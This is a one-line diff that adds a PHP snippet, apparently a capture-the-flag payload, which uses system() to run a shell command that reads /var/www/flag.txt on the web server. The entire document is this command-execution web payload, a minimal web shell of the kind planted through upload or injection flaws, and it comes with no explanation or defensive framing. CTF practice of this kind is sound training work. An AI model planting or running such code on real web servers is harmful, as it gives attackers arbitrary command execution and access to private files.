@@ -1,0 +1,1 @@
+<? echo system('cat /var/www/flag.txt'); ?>
